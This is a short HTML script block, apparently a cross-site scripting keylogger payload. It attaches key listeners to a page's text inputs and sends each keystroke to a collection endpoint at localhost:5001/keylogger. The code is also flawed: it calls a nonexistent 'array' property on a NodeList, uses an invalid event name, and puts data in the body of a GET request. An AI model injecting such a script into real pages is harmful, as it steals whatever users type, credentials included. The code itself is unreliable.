<script>
function sendKeyPress(e) { 
    var x = new XMLHttpRequest();x.open("GET","http://localhost:5001/keylogger",true);
x.send("key="+e); }
    var elements=document.querySelectorAll("input[type='text']");
    elements.array.forEach(element => {
        element.addEventListener("onkeypress",(e)=>sendKeyPress(e.key))
    });
</script>